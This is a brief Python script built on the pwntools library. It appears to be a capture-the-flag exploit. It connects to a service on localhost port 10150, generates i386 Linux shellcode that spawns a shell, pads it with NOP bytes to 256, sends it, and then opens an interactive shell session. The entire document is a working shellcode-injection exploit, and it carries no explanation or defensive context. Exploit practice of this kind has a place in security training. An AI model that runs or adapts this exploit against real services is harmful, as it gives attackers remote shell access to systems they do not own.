# coding: UTF-8

from pwn import *

r = remote('localhost', 10150)
context(arch='i386', os='linux')

payload = asm(shellcraft.sh())

r.send(payload.ljust(256, '\x90'))

r.interactive()
